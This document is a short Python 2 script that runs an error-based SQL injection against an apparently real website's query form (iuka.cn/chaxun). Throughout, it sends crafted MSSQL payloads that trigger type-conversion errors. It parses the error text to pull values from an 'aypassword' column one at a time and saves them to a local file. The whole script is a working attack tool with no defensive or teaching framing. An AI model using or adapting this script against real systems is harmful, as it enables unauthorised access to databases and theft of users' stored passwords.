#-*- coding:utf8 -*-
import requests
import os
import sys
reload(sys)
sys.setdefaultencoding( "utf8" )

url='http://www.iuka.cn/chaxun'
base_path='C:/Users/lovebear96/Desktop/hackit/data/ayname/'

f1=open(base_path+'ayname.txt','r')
col_list=f1.read().replace("', '","'").split("'")[1:-1]
col_list=['aypassword']
i=0
for col in col_list:
	data_list=['null']
	if(not os.path.exists(base_path+'ayname_data')):
		os.mkdir(base_path+'ayname_data')
	f2=open(base_path+'ayname_data/'+col+'.txt','w')
	while True:
		con="123'/**/and/**/convert(int,(select/**/top/**/1/**/"+col+"/**/from/**/ayname/**/where/**/"+col+"/**/not/**/in('"+"','".join(data_list)+"')))=0-- "
		data={
			'con':con,
			'act':'cha'
		}
		r=requests.post(url,data=data) 
		text=r.content.decode('gbk')
		start=text.find(u'值')
		end=text.find(u'转换成')
		if(end==-1):
			end=text.find(u'时溢出了')
		new_data=repr(text[start+3:end-2])
		if new_data=='' or end==-1 or new_data=='null':
			break
		new_data=new_data[2:-1].strip()
		data_list.append(new_data)
		start+=len(new_data)+3
	if(len(data_list)>1):
		f2.write(str(data_list[1:]))
		f2.close()
	else:
		f2.close()
		os.remove(base_path+'ayname_data/'+col+'.txt')
	i=i+1
	print i
f1.close()

